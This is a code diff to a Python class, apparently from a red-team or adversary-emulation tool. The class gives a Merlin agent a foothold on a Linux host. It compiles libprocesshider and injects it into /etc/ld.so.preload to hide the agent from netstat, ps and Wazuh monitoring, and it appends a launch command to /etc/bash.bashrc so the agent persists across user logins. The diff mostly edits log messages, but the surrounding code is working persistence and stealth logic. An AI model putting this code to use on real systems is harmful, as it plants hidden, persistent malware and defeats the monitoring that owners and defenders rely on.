@@ -18,7 +18,7 @@ class MerlinFoothold:
         self._preload_path = "/etc/ld.so.preload"
         self._pid_file = Path("/tmp/run.swp")
         self._bashrc_path = "/etc/bash.bashrc"
-        self._bashrc_foothold_command = f"python3 {self._foothold_script_path}\n"
+        self._bashrc_foothold_command = f"python3 {self._foothold_script_path}"
 
     @staticmethod
     def log_stdout_stderr(calling_process_name: str, process: subprocess.CompletedProcess, log_level: str = "debug"):
@@ -131,7 +131,9 @@ class MerlinFoothold:
     def cloak_merlin(self):
         logger.info("Starting compilation of libprocesshider\n"
                     f"An artifact from this compilation will be injected into '{self._preload_path}'\n"
-                    "Once injected, Merlin should be invisible to commands that Wazuh can use for monitoring processes (e.g., `netstat`)")
+                    f"Code injected into '{self._preload_path}' will run before any program on the system\n",
+                    "Once this code is injected, Merlin should be invisible to commands that are used to monitor processes (e.g., `netstat`, `ps`, etc.)\n"
+                    "By default, Wazuh uses `netstat` to monitor network connections")
         calling_process_name = "gcc"
         process = subprocess.run([calling_process_name,
                                   "-Wall",
@@ -204,8 +206,9 @@ class MerlinFoothold:
 
     def establish_bashrc_foothold(self):
         with open(self._bashrc_path, "a") as file:
-            file.write(self._bashrc_foothold_command)
-        logger.info(f"Injecting '{self._bashrc_foothold_command}' into '{self._bashrc_path}' for persistence")
+            file.write(self._bashrc_foothold_command + "\n")
+        logger.info(f"Injecting '{self._bashrc_foothold_command}' into '{self._bashrc_path}' for persistence\n"
+                    f"Whenever a user logs into the system, this command will be executed")
 
     def persist_pid_file(self, merlin_pid):
         logger.debug(f"Attempting to persist pid {merlin_pid}")
